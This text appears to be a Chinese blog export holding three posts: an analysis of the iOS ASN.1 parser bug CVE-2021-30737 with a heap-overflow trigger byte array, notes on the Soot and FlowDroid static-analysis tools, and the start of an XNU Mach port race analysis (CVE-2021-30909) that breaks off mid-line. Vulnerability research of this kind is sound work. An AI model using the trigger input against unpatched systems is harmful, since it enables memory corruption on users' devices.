sec_asn1d_parse_place place; unsigned long contents_length; unsigned long pending; unsigned long consumed; int depth;} sec_asn1d_state; 解析状态机的主要引擎是SEC_ASN1DecoderUpdate方法，它接收一个上下文对象、原始输入缓冲区和长度： 123SECStatusSEC_ASN1DecoderUpdate (SEC_ASN1DecoderContext *cx, const char *buf, size_t len) 当前状态存储在上下文对象的current字段中，而该当前状态的place字段决定了解析器当前所处的状态，这些状态字段如下： 1234567891011121314151617181920212223242526272829typedef enum { beforeIdentifier, duringIdentifier, afterIdentifier, beforeLength, duringLength, afterLength, beforeBitString, duringBitString, duringConstructedString, duringGroup, duringLeaf, duringSaveEncoding, duringSequence, afterConstructedString, afterGroup, afterExplicit, afterImplicit, afterInline, afterPointer, afterSaveEncoding, beforeEndOfContents, duringEndOfContents, afterEndOfContents, beforeChoice, duringChoice, afterChoice, notInUse} sec_asn1d_parse_place; 状态机通过switch进行判断： 12345678910111213switch (state-&gt;place) { case beforeIdentifier: consumed = sec_asn1d_parse_identifier(state, buf, len); what = SEC_ASN1_Identifier; break; case duringIdentifier: consumed = sec_asn1d_parse_more_identifier(state, buf, len); what = SEC_ASN1_Identifier; break; case afterIdentifier: sec_asn1d_confirm_identifier(state); break;... 每个可以消耗输入的状态方法，都会被传递一个指向原始输入缓冲区中下一个未消耗的字节的指针（buf）和一个剩余未消耗的字节数（len）。然后这些方法返回他们所消耗的输入量，并通过更新上下文对象的状态字段来发出任何错误信号。 解析器可以是递归的：一个状态可以把它的-&gt;place字段设置为一个期望处理解析的子状态的状态，然后分配一个新的子状态。例如，当解析一个ASN.1序列时。 123state-&gt;place = duringSequence;state = sec_asn1d_push_state(state-&gt;top, state-&gt;theTemplate + 1, state-&gt;dest, PR_TRUE); 当前状态将自己的下一个状态设置为 duringSequence，然后调用 sec_asn1d_push_state，它分配了一个新的状态对象，有一个新的模板和一个父代的 dest 字段的副本。 sec_asn1d_push_state会更新上下文的当前字段，这样一来，SEC_ASN1DecoderUpdate的下一个循环就会把这个子状态视为当前状态。 1cx-&gt;current = new_state; 新分配的子的位置字段（决定当前状态）的初始值由模板决定。然后，该子代所遵循的状态机路径中的最终状态将负责将自己从状态堆栈中弹出，以便其父代可以到达 duringSequence 状态，以消费子代的结果。 缓冲区管理缓冲区管理是NSS ASN.1解析器开始变得非常令人费解的地方。如果你仔细阅读代码，你会注意到当输出缓冲区被填入时极度缺乏边界检查–基本上没有。例如，sec_asn1d_parse_leaf将原始编码的字符串字节复制到输出缓冲区中，但没有对字符串的长度与缓冲区的大小进行界限检查。 与其使用明确的边界检查来确保长度有效，不如依靠这样的事实来实现内存安全，即有效的ASN.1解码永远不会产生大于其输入的输出。 也就是说，没有任何形式的解压或输入扩展，所以任何解析的输出数据必须等于或短于编码它的输入。NSS利用这一点，将所有的输出缓冲区过度分配，使其与输入一样大。 对于原始字符串来说，这是很简单的：长度和输入都是提供的，所以实际上没有什么可以出错的。但是对于构造字符串来说，这就有点麻烦了…… 构建字符串的一种方式是将其视为子字符串的树，最多嵌套32层。这里有一个例子。 我们从一个构建好的确定长度的字符串开始。这个字符串的长度值L是构成这个字符串的剩余输入的完整大小；这个数量的输入字节应该被解析为子串，并连接起来形成解析后的输出。 在这一点上，NSS ASN.1字符串解析器使用该第一个输入字符串的长度L，为解析后的输出字符串分配输出缓冲区。这个缓冲区是一个过度分配的最坏情况。但真正有趣的部分是，NSS分配了输出缓冲区，然后立即扔掉了这个长度！这一点在快速浏览代码时可能不是那么明显。被分配的缓冲区被存储为缓冲区封装类型的Data字段。 1234typedef struct cssm_data { size_t Length; uint8_t * __nullable Data;} SecAsn1Item, SecAsn1Oid; Length字段不是分配的Data缓冲区的大小。它是一个（特定类型的）计数，决定了Data所指向的缓冲区有多少比特或字节是有效的。(CVE-2016-1950是NSS中的一个错误，代码混淆了这些单位。) 与其将分配的缓冲区大小与缓冲区指针一起存储，不如在每次遇到子串时，解析器在当前正在解析的状态堆栈中往上走，找到最里面的确定长度的字符串。当它向上查询的时候，会检查每个状态，以确定它已经消耗了多少输入，以便能够确定当前要解析的子串是否完全被包围在最内层的定长字符串中。如下所示： 12345678910111213141516171819202122232425262728293031323334sec_asn1d_state *parent = sec_asn1d_get_enclosing_construct(state);while (parent &amp;&amp; parent-&gt;indefinite) { parent = sec_asn1d_get_enclosing_construct(parent);}unsigned long remaining = parent-&gt;pending;parent = state;do { if (!sec_asn1d_check_and_subtract_length(&amp;remaining, parent-&gt;consumed, state-&gt;top) || /* If parent-&gt;indefinite is true, parent-&gt;contents_length is * zero and this is a no-op. */ !sec_asn1d_check_and_subtract_length(&amp;remaining, parent-&gt;contents_length, state-&gt;top) || /* If parent-&gt;indefinite is true, then ensure there is enough * space for an EOC tag of 2 bytes. */ ( parent-&gt;indefinite &amp;&amp; !sec_asn1d_check_and_subtract_length(&amp;remaining, 2, state-&gt;top) ) ) { /* This element is larger than its enclosing element, which is * invalid. */ return; }} while ((parent = sec_asn1d_get_enclosing_construct(parent)) &amp;&amp; parent-&gt;indefinite); 首先沿着状态栈向上走，找到最内层构建的确定状态，并使用其状态&gt;待定值作为上限。然后，再走一遍状态栈，对于每一个中间状态，从原来的挂起值中减去那些中间状态可能消耗的字节数。很明显，待定值是非常重要的；它被用来确定一个上限，所以如果我们把它弄乱了，这个 “边界检查 “就会出错。 漏洞原理漏洞位于sec_asn1d_parse_bit_string中，包含 ASN.1 解析器的 MacOS 11.4 和 11.3 版本的secasn1d.c之间的差异： 12345678910111213141516171819202122232425262728293031323334diff --git a/OSX/libsecurity_asn1/lib/secasn1d.c b/OSX/libsecurity_asn1/lib/secasn1d.cindex f338527..5b4915a 100644--- a/OSX/libsecurity_asn1/lib/secasn1d.c+++ b/OSX/libsecurity_asn1/lib/secasn1d.c@@ -434,9 +434,6 @@ loser: PORT_ArenaRelease(cx-&gt;our_pool, state-&gt;our_mark); state-&gt;our_mark = NULL; }- if (new_state != NULL) {- PORT_Free(new_state);- } return NULL; }@@ -1794,19 +1791,13 @@ sec_asn1d_parse_bit_string (sec_asn1d_state *state, /*PORT_Assert (state-&gt;pending &gt; 0); */ PORT_Assert (state-&gt;place == beforeBitString);- if ((state-&gt;pending == 0) || (state-&gt;contents_length == 1)) {+ if (state-&gt;pending == 0) { if (state-&gt;dest != NULL) { SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest); item-&gt;Data = NULL; item-&gt;Length = 0; state-&gt;place = beforeEndOfContents;- }- if(state-&gt;contents_length == 1) {- /* skip over (unused) remainder byte */- return 1;- }- else {- return 0;+ return 0; } } 在确定边界检查可能会出问题以后，看一下sec_asn1d_parse_bit_string函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243static unsigned longsec_asn1d_parse_bit_string (sec_asn1d_state *state, const char *buf, unsigned long len) { unsigned char byte; /*PORT_Assert (state-&gt;pending &gt; 0); */ PORT_Assert (state-&gt;place == beforeBitString); if ((state-&gt;pending == 0) || $(state-&gt;contents_length == 1)$) { if (state-&gt;dest != NULL) { SecAsn1Item *item = (SecAsn1Item *)(state-&gt;dest); item-&gt;Data = NULL; item-&gt;Length = 0; state-&gt;place = beforeEndOfContents; } $ if(state-&gt;contents_length == 1) { $ /* skip over (unused) remainder byte */ $ return 1; $ } $ else { $ return 0; $ } } if (len == 0) { state-&gt;top-&gt;status = needBytes; return 0; } byte = (unsigned char) *buf; if (byte &gt; 7) { dprintf(&quot;decodeError: parse_bit_string remainder oflow\\n&quot;); PORT_SetError (SEC_ERROR_BAD_DER); state-&gt;top-&gt;status = decodeError; return 0; } state-&gt;bit_string_unused_bits = byte; state-&gt;place = duringBitString; state-&gt;pending -= 1; return 1;} $注释的区域是被补丁删除的部分。这个函数的目的是返回它所消耗的输入字节数（由buf指向），我最初的直觉是注意到补丁删除了一个通过这个函数的路径，在那里你可以得到所消耗的输入字节数和待定字节数的同步。应该是这样的，当他们在被删除的代码中返回1时，他们也会递减state&gt;pending，就像他们在该函数返回1的其他地方所做的那样。 达到这个状态时，buf指向一个原始位串的长度值之后的第一个字节。state&gt;contents_length是这个解析后的长度值。正如前面所讨论的，位串是一种独特的ASN.1字符串类型，因为它们在开头有一个额外的元数据字节（未使用的位数字节）。有一个明确的零长度的字符串是完全可以的–事实上，这在prepareForContents状态中已经（有点）提前处理了，它直接短路到afterEndOfContents。 12345if (state-&gt;contents_length == 0 &amp;&amp; (! state-&gt;indefinite)) { /* * A zero-length simple or constructed string; we are done. */ state-&gt;place = afterEndOfContents; 这里他们检测的是一个内容长度为0的确定长度的字符串类型。但这并没有处理一个只由未使用的位数字节组成的位串的边缘情况。该位串的state&gt;contents_length值将是1，但它实际上没有任何 内容。 sec_asn1d_parse_bit_string中的(state&gt;contents_length == 1)条件正是符合这种情况。 通过将state&gt;place设置为beforeEndOfContents，他们再次试图绕过状态机，跳到字符串内容被消耗后的状态。但在这里，他们采取了一个额外的步骤，而在prepareForContents中他们并没有采取同样的步骤。除了更新state&gt;place之外，他们还把目的地SecAsn1Item的Data字段空出来，并把Length设置为0。 前面提到，为递归解析构建的字符串的子字符串而分配的新子状态得到了父状态的dest字段的副本（它是一个指向输出缓冲区的指针）。(从技术上讲，如果最外层的字符串是无限长的，实际上不是这样的，对这种情况有单独的处理，而是建立一个子字符串的链接列表，最终被连接起来，见sec_asn1d_concat_substrings)。 如果输出缓冲区只分配一次，那么如果你像这里一样将数据设置为NULL会怎样？退一步讲，这实际上有任何意义吗？ 不，我不认为这有任何意义。在这一点上，将Data设置为NULL至少会导致内存泄漏，因为它是输出缓冲区的唯一指针。 但有趣的是，这并不是将该指针设为NULL的唯一后果， item-&gt;Data被用来发出其他信号。 下面是prepare_for_contents的一个片段，当它确定输出缓冲区中是否有足够的空间给这个子串时： 1234567891011121314151617} else if (state-&gt;substring) { /* * If we are a substring of a constructed string, then we may * not have to allocate anything (because our parent, the * actual constructed string, did it for us). If we are a * substring and we *do* have to allocate, that means our * parent is an indefinite-length, so we allocate from our pool; * later our parent will copy our string into the aggregated * whole and free our pool allocation. */ if (item-&gt;Data == NULL) { PORT_Assert (item-&gt;Length == 0); poolp = state-&gt;top-&gt;our_pool; } else { alloc_len = 0; } 如果此时 item-&gt;Data 是 NULL，state&gt;substring 是真的，那么一定是他们目前正在解析一个外层不确定字符串的子串，这个字符串没有已经分配的确定大小的缓冲区。在这种情况下，item-&gt;Data指针的含义与我们前面描述的不同：它只是一个临时缓冲区，目的是只容纳这个子串。就在上面，alloc_len被设置为这个子串的内容长度；对于外部定义长度的情况，至关重要的是alloc_len在这里被设置为0（这实际上是表明一个缓冲区已经被分配了，他们必须不分配一个新的。） 为了强调这个潜在的微妙之处：问题在于，使用这个连词（state&gt;substring &amp;&amp; !item-&gt;Data）来确定这是一个确定长度的子串还是外层不确定的字符串，与我们前面看到的复杂的边界检查代码所使用的方法不同。那个方法是沿着当前状态堆栈向上走，检查超字符串的不定位，以确定它们是否在处理一个外层不定字符串的子串。 假设我们有一个外层定长构造的比特串，有三个原始比特串作为子串。 在遇到第一个最外层的确定长度的比特串时，代码将分配一个固定大小的缓冲区，其大小足以存储构成这个字符串的所有剩余输入，在本例中是42字节。在这一点上，dest-&gt;Data指向该缓冲区。 然后他们分配一个子状态，获得dest指针的拷贝（不是dest SecAsn1Item对象的拷贝；是指向它的指针的拷贝），并继续解析第一个子字符串。 这是一个长度为1的原始位串，它触发了sec_asn1d_parse_bit_string中的脆弱路径并将dest-&gt;Data设置为NULL。状态机跳转到beforeEndOfContents，然后最终下一个子串被解析–这次dest-&gt;Data == NULL。 现在逻辑出了问题，正如我们在上面的片段中看到的，一个新的dest-&gt;Data缓冲区被分配，其大小只有这个子串（2字节），而事实上dest-&gt;Data应该已经指向一个足够大的缓冲区来容纳整个外层不确定的输入字符串。然后，这个子串的内容被解析并复制到该缓冲区。 现在我们来到了第三个子串。 dest-&gt;Data不再是NULL；但是代码现在没有办法确定缓冲区实际上只是（错误地）被分配来容纳一个子串。它相信 item-&gt;Data 只被分配一次的不变性，当遇到第一个外层确定长度的字符串时，它仅用这个事实来确定 dest-&gt;Data 是否指向一个足够大的缓冲区，以便将这个子串追加到其中。然后它很高兴地追加了这第三个子串，在分配给只存储第二个子串的缓冲区的范围之外写入。 这里有一个很好的内存破坏原语：可以造成一个受控大小的分配，然后用任意数量的任意字节溢出它们。 触发的例子： 123456789101112131415uint8_t concat_bitstrings_constructed_definite_with_zero_len_realloc[] = {ASN1_CLASS_UNIVERSAL | ASN1_CONSTRUCTED | ASN1_BIT_STRING, // (0x23) 0x4a, // initial allocation size ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING, 0x1, // force item-&gt;Data = NULL 0x0, // number of unused bits in the final byte ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING, 0x2, // this is the reallocation size 0x0, // number of unused bits in the final byte 0xff, // only byte of bitstring ASN1_CLASS_UNIVERSAL | ASN1_PRIMITIVE | ASN1_BIT_STRING, 0x41, // 64 actual bytes, plus the remainder, will cause 0x40 byte memcpy one byte in to 2 byte allocation 0x0, // number of unused bits in the final byte 0xff, 0xff,// -- continues for overflow 参考链接https://googleprojectzero.blogspot.com/2022/04/cve-2021-30737-xerubs-2021-ios-asn1.html?m=1","link":"/2022/04/11/iOS-ASN-1-%E6%BC%8F%E6%B4%9E-CVE-2021-30737/"},{"title":"Soot笔记","text":"静态分析给定一个输入程序，输出程序的属性。 Rice 定律在一个即递归可枚举(recursively enumerable)语言中，任何程序行为的 non-trivial 属性都是不可解释的。non-trivial 属性指的是那些与程序运行行为有关的属性。 即不存在完美的静态分析。 国内课程：北大熊英飞、南大及南大B站的视频。 调用图一个调用图就是从调用点到目标方法的一系列调用边。 算法CHA论文地址。 定义 需要首先获得整个程序的类继承关系图 通过接收变量的声明类型来解析 Virtual call 接收变量的例子：在 a.foo() 中，a 就是接收变量 假设一个接收变量能够指向 A 或 A 的所有子类 具体过程通过 CHA 算法寻找到某个程序调用点对应的可能的目标函数实体。 call site(cs) 就是调用语句，m(method) 就是对应的函数签名。 T 集合中保存找到的结果 static call静态方法调用前写的是类名，而非静态方法调用前写的是变量或指针名。静态方法调用不需要依赖实例，所以直接加到集合 T 中。 special call使用 super 类的调用方法。foo() 虽然在当前类有定义，但是实际使用的是父类的 foo()，因此需要使用 Dispatch 函数。其中的 foo() 的签名 m 由编译器返回信息可知是父类 B 的，那么获取 foo() 返回值的 c 也指向 B，也就相当于在父类中寻找了。 virtual call这是CHA 区别于其他算法的主要之处。该算法会对此方法做一个 Dispatch(c,m) 并将 c 的所有子集以及子集的子集全都做一次 Dispatch(c', m)。直观来看，可以分为两步，第一步是对本身做一次 Dispatch，看看当前类中是否有 foo()，没有的话就到父类中递归地找；第二步是在当前类地所有子集中找到所有的 foo()，然后将这些 foo 同第一步找到的 foo 全都加入 T 中。 一个🌰： CHA 的特征 只考虑类继承结构，所以很快 因为忽略了数据流和控制流的信息，所以不太准确 SPARK论文地址。 通过使用 PointsTo Analysis 找到变量的实际类型来准确地处理这种情况。与 CHA 相比，SPARK 去除了许多虚假边缘；但是，它要慢得多，并且可能会漏掉一些真正的边。 指针分析指针分析要解决的问题 程序中的指针指向哪个内存的问题，Java语言中的指针分析指的是一个指针指向程序中的哪个对象（Object)的问题。通常指针分析是一个may-analysis，分析的结果通常是一个指针可能指向哪些对象。 指针分析的应用 可以用来计算其他基本信息（别名分析，调用图…)。 编译优化。 找Bug。 安全性分析。 …… 指针分析是最基础的静态分析之一，也是很多其他分析的基础。 Sootsoot有很多Option配置，可以参考这里或者这里。 IRJimple介于 Java 和 Java 字节码之间，是一个基于语句的、类型化的（每个变量都有一个类型）和 3-addressed（每条语句最多有 3 个变量）的中间表示。 三地址码，一条指令的右侧最多只有一个运算符，如 x+y*z表示为： 123t1 = y*z;t2 = x + t1;x = t2; 调用方法： specialinvoke：用于调用构造方法、父类方法、私有方法。 virtualinvoke：用于调用普通的成员方法，进行virtual dispatch。 interfaceinvoke：用于调用继承的接口的方法，不能做优化，需要检查是否实现了接口中的方法。 staticinvoke：用于调用静态方法。 例子： 1234567891011121314151617181920(1) r0 := @this: FizzBuzz(2) i0 := @parameter0: int(3) $i1 = i0 % 15(4) if $i1 != 0 goto $i2 = i0 % 5(5) $r4 = &lt;java.lang.System: java.io.PrintStream out&gt;(6) virtualinvoke $r4.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;FizzBuzz&quot;) // 尖括号内的是方法签名(7) goto [?= return](8) $i2 = i0 % 5(9) if $i2 != 0 goto $i3 = i0 % 3(10) $r3 = &lt;java.lang.System: java.io.PrintStream out&gt;(11) virtualinvoke $r3.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;Buzz&quot;)(12) goto [?= return](13) $i3 = i0 % 3(14) if $i3 != 0 goto $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;(15) $r2 = &lt;java.lang.System: java.io.PrintStream out&gt;(16) virtualinvoke $r2.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;Fizz&quot;)(17) goto [?= return](18) $r1 = &lt;java.lang.System: java.io.PrintStream out&gt;(19) virtualinvoke $r1.&lt;java.io.PrintStream: void println(int)&gt;(i0)(20) return Shimple与Jimple基本相同，是Jimple静态单任务形式的中间表示。 Baf是流线型的基于栈的字节表示。将java字节码转为基于栈的代码。 Grimp与Jimple 类似，比Jimple更接近于java源码。容易阅读，方便人工阅读。 数据结构基本的数据结构如下： Scene，是一个单例类，表示所分析的环境。 SootClass，用于表示Scene中的类。 SootMethod，用于表示SootClass中的方法。 Body，使用Body来访问SootMethod中的各种信息，每个Body里面有三个主链，分别是Units链、Locals链、Traps链。。 Local，方法内的局部变量。 Trap，方法内的异常处理。 Unit，方法体内的语句。 还有四种Body，对应四种中间表示：BafBody、JimpleBody、ShimpleBody、GrimpBody，Soot 中的默认 IR 是 **Jimple**（Java Simple）。 Unit（Jimple中是Stmt）表示Unit语句。主要有以下几种： 核心语句：NopStmt， DefinitionStmt(IdentityStmt， AssignStmt)。 IdentityStmt：通常指的是对变量赋值，这个变量既可以是显式的也可以是隐式的。 一个IdentityStmt将特殊值，如参数、this或被捕获的异常，分配给一个Local。 所有正常的赋值，例如从一个Local到另一个Local，或者从一个Constant到一个Local，都是用AssignStmt表示的。 负责过程内控制流的语句：IfStmt ， GotoStmt ， TableSwitchStmt ， LookupSwitchStmt。 负责过程间的控制流语句：InvokeStmt ， ReturnStmt ， ReturnVoidStmt。 监控语句：EnterMonitorStmt ， ExitMonitorStmt。 ThrowStmt ， RetStm。 Value Local Constant Ref Expr LocalJimpleLocal：local变量 TemporaryRegisterLocal： $开头的临时变量 Constant RefConcreteRef： ArrayRef：指向数组。 FieldRef： 指向field。 StaticFieldRef ：静态field的引用。 InstanceFieldRef ：指向的field是一个对象实例。 IdentityRef： CaughtExceptionRef ：指向捕获到的异常的引用 ParameterRef：函数参数的引用 ThisRef ：this的引用 Expr一般来说，一个Expr可以对若干个Value进行一些操作并且返回另一个Value。在Jimple中，强制要求所有的Value最多包含一个表达式。 Stmt和Expr的区别：Stmt没有返回值，Expr有返回值。 BoxBox是指针，提供了对Soot对象的间接访问。一个Box提供了一个间接访问soot(Unit,Value)的入口，类似于Java的一个引用。当Unit包含另一个Unit的时候，需要通过Box来访问，Soot 里提供了两种类型的Box, 一个是ValueBox一个是UnitBox。 ValueBox，指向Values： 对于一条Unit来说，他的ValueBox存储的是在这条语句内部所用到的和所定义的语句。 UnitBox，指向Units： 以goto语句为例，UnitBox其实存的就是goto所指的下一跳节点。 switch语句，则会包含很多boxes。 还需要知道以下的规则： **一个Unit可以有多个UnitBox，但是每个UnitBox只能指向一个Unit**。GotoStmt 需要知道目标的Unit是什么，所以一个Unit会包含其它的UnitBox，通过 UnitBox获取下一个Unit。 **一个Value可以对应多个ValueBox，但是一个ValueBox只能对应一个Value**，对于一个Unit，可以得到很多个ValueBox，包含着这条语句内部的所用到和所定义的语句。 基本API SootClass获取一个类的信息，如果类是在一个包里，则应该包含完整的包名： 1circleClass = Scene.v().getSootClass(&quot;Circle&quot;) 如果分析的类不在Scene中，则getSootClass将返回一个Phantom类或者是异常。Phantom类不影响分析的进行，这在不关注其他模块的代码时很有用。如果要确保查询的类存在，可以通过getSootClassUnsafe(className, false)（如果不存在，则结果为空）检索它或者使用circleClass.isPhantom()判断它是不是为Phantom类。 SootField类中包含字段和方法，通过名称和类型来查找它们： 1SootField radiusField = circleClass.getField(&quot;radius&quot;, IntType.v()) SootMethod 一般情况下使用getMethodByName即可： 1circleClass.getMethodByName(&quot;getCircleCount&quot;) 但是对于方法重载，需要使用getMethod方法，并提供Subsignature： 1circleClass.getMethod(&quot;int area(boolean)&quot;) Modifier类、方法和字段的访问模式：pulic、priavet、protected、final、abstract等。这些信息保存在Modifier中，比如，查询一个方法是否为静态的： 1Modifier.isStatic(method.getModfiers()) Body在Body中有Units，Values，Traps。 修改代码Soot可以修改方法的Body。然后可以使用validate检查修改是否正确。 1234567stmt.apply(new AbstractStmtSwitch() { @Override public void caseIfStmt(IfStmt stmt) { stmt.setTarget(body.getUnits().getSuccOf(stmt)); }});body.validate(); APK分析首先，soot使用Dexpler 将 Dalvik 字节码转换为 Jimple Body。然后可以对整个程序进行转换、优化和注释。接下来， Jimple 转换包将在每个 Jimple Body上运行。最后，Soot 将所有 Jimple Body转换为 Baf（Soot 中的低级中间表示），并使用 Dexpler 将整个代码编译成 APK。 jtp，jimple转换包。 jop，jimple优化包。 jap，jimple注释包。 关于包的具体信息可以看这里。 Soot设置关于Option的详细信息在这里。 分析APK之前，Soot还需要进行一些设置： 12345678910111213141516171819202122public static void setupSoot(String androidJar, String apkPath, String outputPath) { // Reset the Soot settings (it's necessary if you are analyzing several APKs) G.reset(); // Generic options Options.v().set_allow_phantom_refs(true); Options.v().set_whole_program(true); Options.v().set_prepend_classpath(true); // Read (APK Dex-to-Jimple) Options Options.v().set_android_jars(androidJar); // The path to Android Platforms Options.v().set_src_prec(Options.src_prec_apk); // Determine the input is an APK Options.v().set_process_dir(Collections.singletonList(apkPath)); // Provide paths to the APK Options.v().set_process_multiple_dex(true); // Inform Dexpler that the APK may have more than one .dex files Options.v().set_include_all(true); // Write (APK Generation) Options Options.v().set_output_format(Options.output_format_dex); Options.v().set_output_dir(outputPath); Options.v().set_validate(true); // Validate Jimple bodies in each transofrmation pack // Resolve required classes Scene.v().addBasicClass(&quot;java.io.PrintStream&quot;,SootClass.SIGNATURES); Scene.v().addBasicClass(&quot;java.lang.System&quot;,SootClass.SIGNATURES); Scene.v().loadNecessaryClasses();} 案例一 插入指令在每个方法中加入日志输出：System.out.println(&quot;Beginning of method: &quot; + METHOD_NAME)。jimple代码： 12$r1 = &lt;java.lang.System: java.io.PrintStream out&gt;virtualinvoke $r1.&lt;java.io.PrintStream: void println(java.lang.String)&gt;(&quot;&lt;SOOT_TUTORIAL&gt; Beginning of method METHOD_NAME&quot;) Body转换： 12345678910111213141516171819202122232425262728PackManager.v().getPack(&quot;jtp&quot;).add(new Transform(&quot;jtp.myLogger&quot;, new BodyTransformer() { @Override protected void internalTransform(Body b, String phaseName, Map&lt;String, String&gt; options) { // First we filter out Android framework methods if(InstrumentUtil.isAndroidMethod(b.getMethod())) return; JimpleBody body = (JimpleBody) b; UnitPatchingChain units = b.getUnits(); List&lt;Unit&gt; generatedUnits = new ArrayList&lt;&gt;(); // The message that we want to log String content = String.format(&quot;%s Beginning of method %s&quot;, InstrumentUtil.TAG, body.getMethod().getSignature()); // In order to call &quot;System.out.println&quot; we need to create a local containing &quot;System.out&quot; value Local psLocal = InstrumentUtil.generateNewLocal(body, RefType.v(&quot;java.io.PrintStream&quot;)); // Now we assign &quot;System.out&quot; to psLocal SootField sysOutField = Scene.v().getField(&quot;&lt;java.lang.System: java.io.PrintStream out&gt;&quot;); AssignStmt sysOutAssignStmt = Jimple.v().newAssignStmt(psLocal, Jimple.v().newStaticFieldRef(sysOutField.makeRef())); generatedUnits.add(sysOutAssignStmt); // Create println method call and provide its parameter SootMethod printlnMethod = Scene.v().grabMethod(&quot;&lt;java.io.PrintStream: void println(java.lang.String)&gt;&quot;); Value printlnParamter = StringConstant.v(content); InvokeStmt printlnMethodCallStmt = Jimple.v().newInvokeStmt(Jimple.v().newVirtualInvokeExpr(psLocal, printlnMethod.makeRef(), printlnParamter)); generatedUnits.add(printlnMethodCallStmt); // Insert the generated statement before the first non-identity stmt units.insertBefore(generatedUnits, body.getFirstNonIdentityStmt()); // Validate the body to ensure that our code injection does not introduce any problem (at least statically) b.validate(); }})); 案例二 FlowDroidFlowDroid 是一款用于 Android 应用程序和 Java 程序的数据流分析功能，项目地址。 如果是使用 Maven，编辑 pom.xml即可： 1234567891011121314151617&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow-summaries&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;de.fraunhofer.sit.sse.flowdroid&lt;/groupId&gt; &lt;artifactId&gt;soot-infoflow-android&lt;/artifactId&gt; &lt;version&gt;2.10.0&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 如果只使用命令行，则在Relase里下载soot-infoflow-cmd-jar-with-dependencies.jar即可。 如果不使用pom.xml，使用jar包的方式，需要去Relase下载soot-infoflow-android-classes.jar和soot-infoflow-classes.jar，再去Soot的仓库下载包含heros与jasmin的sootclasses-trunk-jar-with-dependencies.jar，将上述三个包加入项目依赖便完成了FlowDroid的配置。","link":"/2022/06/12/Soot%E7%AC%94%E8%AE%B0/"},{"title":"CVE-2021-30909","text":"原文链接：https://www.cyberkl.com/cvelist/cvedetail/38 漏洞详情这个漏洞是在XNU Mach端口的预分配消息中的，Apple禁止从用户空间中构造预分配消息 123456789101112131415// mach_port_allocate_full()/* * Don't actually honor prealloc requests from user-space * (for security reasons, and because it isn't guaranteed anyway). * Keep old errors for legacy reasons. */if (qosp-&gt;prealloc) { if (qosp-&gt;len &gt; MACH_MSG_SIZE_MAX - MAX_TRAILER_SIZE) { return KERN_RESOURCE_SHORTAGE; } if (right != MACH_PORT_RIGHT_RECEIVE) { return KERN_INVALID_VALUE; } qosp-&gt;prealloc = 0;} 内核不允许用户创建预分配消息端口，但是我们可以直接创建这种类型的端口。mk_timer就是这样的一个内核对象，它可以在用户空间访问，带有预分配消息的Mach端口。另一方面，即使是带着kobject集合的端口也仍然是正常的，因为它的接收者不是ipc_kernel。这就意味着，发往这些端口的消息将被推送到消息队列而不是内核。 导致这个漏洞的根本原因是，当从该端口获取转门（turnstile）对象时，该端口不被锁定。以ipc_port_send_update_inheritor()为例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455voidipc_port_send_update_inheritor( ipc_port_t port, struct turnstile *send_turnstile, turnstile_update_flags_t flags){ ipc_mqueue_t mqueue = &amp;port-&gt;ip_messages; turnstile_inheritor_t inheritor = TURNSTILE_INHERITOR_NULL; struct knote *kn; turnstile_update_flags_t inheritor_flags = TURNSTILE_INHERITOR_TURNSTILE; imq_held(mqueue); if (!ip_active(port)) { /* this port is no longer active, it should not push anywhere */ } else if (port-&gt;ip_specialreply) { /* Case 1. */ if (port-&gt;ip_sync_bootstrap_checkin &amp;&amp; prioritize_launch) { inheritor = port-&gt;ip_messages.imq_srp_owner_thread; inheritor_flags = TURNSTILE_INHERITOR_THREAD; } } else if (port-&gt;ip_receiver_name == MACH_PORT_NULL &amp;&amp; port-&gt;ip_destination != NULL) { /* Case 2. */ inheritor = port_send_turnstile(port-&gt;ip_destination); } else if (ipc_port_watchport_elem(port) != NULL) { /* Case 3. */ if (prioritize_launch) { assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY); inheritor = ipc_port_get_watchport_inheritor(port); inheritor_flags = TURNSTILE_INHERITOR_THREAD; } } else if (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_KNOTE) { /* Case 4. */ inheritor = filt_ipc_kqueue_turnstile(mqueue-&gt;imq_inheritor_knote); } else if (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_WORKLOOP_STASH) { /* Case 5. */ inheritor = mqueue-&gt;imq_inheritor_turnstile; } else if (port-&gt;ip_sync_link_state == PORT_SYNC_LINK_RCV_THREAD) { /* Case 6. */ if (prioritize_launch) { inheritor = port-&gt;ip_messages.imq_inheritor_thread_ref; inheritor_flags = TURNSTILE_INHERITOR_THREAD; } } else if ((kn = SLIST_FIRST(&amp;mqueue-&gt;imq_klist))) { /* Case 7. Push on a workloop that is interested */ if (filt_machport_kqueue_has_turnstile(kn)) { assert(port-&gt;ip_sync_link_state == PORT_SYNC_LINK_ANY); inheritor = filt_ipc_kqueue_turnstile(kn); } } turnstile_update_inheritor(send_turnstile, inheritor, flags | inheritor_flags);} 在case2 中，如果ip_receiver_name为空，并且ip_destination存在，将会从port-&gt;ip_destination（Mach端口）中获取一个turnstile对象。这样的话，如果当前端口的接收权限被发送给其他端口，XNU把这个接收者叫做ip_destination，内核将会从ip_destination中获取turnstile，而不是当前端口。 首先，目的端口的锁在这个时候没有被持有，这就给了我们一个机会去竞争释放目标端口的turnstile。但如果没有读过这个模块的代码，你会发现这毫无意义。因为当前的端口被绑定到destination，而你不能在当前端口的接收权还在destination的消息队列中时，释放destination的turnstile。 如果深入研究一下port_send_turnstile，我们发现一些有意思的东西： 1#define 